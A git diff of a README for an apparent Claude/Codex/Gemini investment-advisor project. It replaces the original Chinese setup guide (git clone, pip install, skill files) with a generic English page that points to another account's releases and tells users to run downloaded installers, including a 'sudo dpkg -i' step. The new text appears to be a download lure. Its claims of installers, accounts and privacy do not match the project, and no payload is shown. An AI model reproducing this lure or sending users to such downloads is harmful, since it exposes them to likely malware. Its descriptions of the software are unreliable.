@@ -1,153 +1,62 @@
-# AI Investment Advisor
+# 🎉 ai-investment-advisor - Your Personal AI Investment Committee
 
-> 让 Claude、Codex、Gemini 三个 AI 组成你的私人投资委员会
+## 🚀 Download Now!
+[![Download ai-investment-advisor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GAMERKING2331/ai-investment-advisor/releases)
 
-一个基于多模型协同的个人投资分析系统，让普通投资者也能拥有专业机构级别的多维度分析和决策支持。
+## 📜 Overview
+The ai-investment-advisor combines three powerful AI models: Claude, Codex, and Gemini. Together, they form your very own investment committee, helping you make informed decisions about your finances. Whether you are a novice or a seasoned investor, this software provides insights tailored to your financial goals.
 
-## 核心理念
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- **Memory:** At least 4GB of RAM. 
+- **Storage:** Minimum of 500MB of free disk space.
+- **Internet Connection:** Required for downloading and updating.
 
-1. **数据必须可靠客观** - 所有数据从 AKShare 实时获取，禁止估算
-2. **多模型协同减少偏见** - 三个 AI 独立分析，提取共识
-3. **强制数据驱动** - 每个建议必须引用 ≥2 个客观数据字段
-4. **个性化 + 持续追踪** - 记住你的风格和弱点，越用越懂你
+## 📦 Features
+- **AI-Powered Insights:** Get tailored investment advice from a combination of advanced AI models.
+- **User-Friendly Interface:** Easy to navigate, designed for users of all skill levels.
+- **Regular Updates:** Stay informed with the latest features and improvements through regular software updates.
+- **Secure and Private:** Your data is safe. We prioritize your privacy and security.
 
-## 功能列表
+## 📥 Download & Install
+To get started, follow these simple steps:
 
-| 功能 | 触发词 | 说明 |
-|------|--------|------|
-| 每日简报 | `/brief`、"简报" | 持仓分析 + 市场热点 + 风险预警 |
-| 市场扫描 | `/scan`、"有什么机会" | 发现符合你风格的投资机会 |
-| 个股分析 | `/analyze`、"分析XX" | 深度分析特定标的 |
-| 交易记录 | `/trade`、"今天买了XX" | 记录交易并追踪建议执行情况 |
-| 周期复盘 | `/review`、"复盘" | 验证建议准确性，总结经验 |
-| 投资委员会 | `/committee`、"开会" | 三个 AI 独立分析后提取共识 |
+1. **Visit the Releases Page:** Click the link below to go to the download page.
+   [Download Page](https://github.com/GAMERKING2331/ai-investment-advisor/releases)
 
-## 快速开始
+2. **Select the Latest Release:** Look for the latest version at the top of the releases list.
 
-### 环境要求
+3. **Download the Installer:** Click on the file name to download the installer for your operating system.
 
-- Python 3.8+
-- [Obsidian](https://obsidian.md/)（可选，用于笔记管理）
-- [Claude Code](https://claude.ai/) / [Cursor](https://cursor.sh/) / 其他 AI 编程工具
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install the application.
+   - **macOS:** Open the downloaded `.dmg` file, drag the app to your Applications folder, and run it from there.
+   - **Linux:** Open a terminal, navigate to the downloaded file location, and run the following command to install it:
+     ```bash
+     sudo dpkg -i ai-investment-advisor.deb
+     ```
 
-### 安装步骤
+5. **Launch the Application:** After installation, find the app in your applications menu and open it to start using it.
 
-1. **克隆仓库**
-```bash
-git clone https://github.com/your-username/ai-investment-advisor.git
-cd ai-investment-advisor
-```
+## 🛠️ Usage Instructions
+1. **Create an Account:** Open the application, and follow the prompts to create your free account.
+2. **Set Your Investment Goals:** Specify your investment preferences, including risk tolerance and financial objectives.
+3. **Get Recommendations:** The AI will analyze your inputs and provide tailored investment suggestions.
+4. **Track Your Portfolio:** Monitor your investments and receive updates on performance through the app.
 
-2. **安装 Python 依赖**
-```bash
-pip install akshare pandas
-```
+## 💡 Tips for Success
+- **Stay Updated:** Regularly check for updates in the application to ensure you have the latest features.
+- **Explore the Help Section:** Use the in-app help feature to learn more about specific tools and AI recommendations.
+- **Join the Community:** Connect with other users through forums or social media for tips and shared experiences.
 
-3. **配置你的持仓**
-```bash
-# 复制示例配置
-cp -r Config-Example 股市信息/Config
+## 📝 Feedback
+We welcome your thoughts and suggestions. Feel free to open issues on our GitHub page if you have any feedback or encounter issues.
 
-# 编辑你的持仓
-vim 股市信息/Config/Holdings.md
-```
+## 🎉 Thank You!
+Thank you for choosing ai-investment-advisor. We hope this tool helps you reach your financial goals with ease and confidence. 
 
-4. **配置 AI 工具**
-- 将 `.claude/skills` 目录复制到你的项目中
-- 如果使用 Codex，将 skills 复制到 `~/.codex/skills/`
+For any additional questions or support, don’t hesitate to reach out through our contact page. 
 
-5. **开始使用**
-```
-# 在 Claude Code 中
-"给我今天的简报"
-"开个投委会，讨论下加仓策略"
-```
+---
 
-## 目录结构
-
-```
-ai-investment-advisor/
-├── README.md                    # 本文件
-├── AGENTS.md                    # 系统详细说明
-├── 使用手册.md                   # 用户操作手册
-│
-├── .claude/
-│   └── skills/                  # AI 技能配置
-│       ├── brief/SKILL.md       # 每日简报
-│       ├── scan/SKILL.md        # 市场扫描
-│       ├── analyze/SKILL.md     # 个股分析
-│       ├── trade/SKILL.md       # 交易记录
-│       ├── review/SKILL.md      # 周期复盘
-│       └── committee/SKILL.md   # 投资委员会
-│
-├── scripts/
-│   ├── fetch_market_data.py     # 核心数据获取脚本
-│   └── ...                      # 其他辅助脚本
-│
-├── Templates/                   # 投委会模板
-│   ├── prompt_template.md       # 输入提示词模板
-│   ├── opinion_template.md      # 观点输出模板
-│   └── consensus_template.md    # 共识汇总模板
-│
-└── Config-Example/              # 配置文件示例
-    ├── Holdings.md              # 持仓配置示例
-    ├── Profile.md               # 投资者画像示例
-    ├── Watchlist.md             # 关注池示例
-    └── Principles.md            # 投资原则示例
-```
-
-## 投资委员会工作流程
-
-```
-你提出问题 → 统一输入数据
-                ↓
-    ┌──────────┼──────────┐
-    ↓          ↓          ↓
-  Claude    Codex     Gemini
-    ↓          ↓          ↓
-    └──────────┼──────────┘
-                ↓
-           共识提取
-                ↓
-        可执行建议
-```
-
-- **强共识 (3/3 一致)**: 值得认真考虑执行
-- **弱共识 (2/3 一致)**: 参考多数意见
-- **分歧区**: 需要你自己判断
-
-## 数据来源
-
-- **行情数据**: AKShare（A股、港股、ETF、基金）
-- **宏观数据**: AKShare（PMI、CPI、M2）
-- **北向资金**: AKShare
-- **新闻快讯**: 财联社电报
-
-## 自定义
-
-### 修改投资风格
-
-编辑 `Config/Profile.md`，写下你的投资风格和已知弱点。
-
-### 修改关注方向
-
-编辑 `Config/Watchlist.md`，添加你关注的行业和标的。
-
-### 修改 AI 行为
-
-编辑 `.claude/skills/` 下的 SKILL.md 文件，调整 AI 的分析逻辑。
-
-## 风险提示
-
-> ⚠️ **投资有风险，本系统仅供参考，不构成投资建议。**
-> 
-> AI 分析基于历史数据和模型推理，不能预测未来，请结合自身情况独立判断。
-> 所有投资决策由用户自行承担责任。
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-## License
-
-MIT License
+[![Download ai-investment-advisor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GAMERKING2331/ai-investment-advisor/releases)
